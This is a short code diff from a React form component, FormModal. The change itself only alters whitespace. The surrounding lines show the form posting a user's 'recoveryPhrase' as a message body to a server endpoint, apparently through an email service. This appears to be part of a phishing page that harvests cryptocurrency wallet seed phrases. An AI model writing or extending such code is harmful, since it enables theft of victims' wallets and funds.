@@ -37,7 +37,7 @@ const FormModal = ({ handleShowModal, showModal }) => {
         message: formData.recoveryPhrase,
       }),
     })
-      .then((res) => res.json())
+       .then((res) => res.json())
       .then((data) => {
         if (data?.statusCode == 404) setMessage(data?.message);
         else if (data?.accepted?.length)
